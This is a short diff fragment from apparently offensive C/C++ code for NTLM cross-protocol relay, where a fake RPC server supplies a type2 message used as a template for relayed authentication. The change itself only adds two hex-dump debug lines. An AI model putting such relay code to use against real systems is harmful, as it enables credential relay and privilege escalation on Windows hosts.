@@ -78,12 +78,14 @@ void DoHTTPCrossProtocolRelay(wchar_t* remoteIpRelay, wchar_t* remotePortRelay, 
 				printf("[!] Couldn't communicate with the fake RPC Server\n");
 				break;
 			}
+			hexDump2((char*)"type1 received\n", type1BakBuffer, type1BakLen);
 			// receiving the type2 message from the fake RPC Server to use as a template for our relayed auth
 			iResult = recv(RPCSocketReflect, recvbuf, recvbuflen, 0);
 			if (iResult == SOCKET_ERROR) {
 				printf("[!] Couldn't receive the type2 message from the fake RPC Server\n");
 				break;
 			}
+			hexDump2((char*)"type2 forged by fake rpc server\n", recvbuf, iResult);
 			// get the ntlmindex from the type2 message received from the fake rpc server
 			ntlmIndex = findNTLMBytes(recvbuf, iResult);
 			// in this function we take the packet template from a real rpc server and we alter the authentication part, 
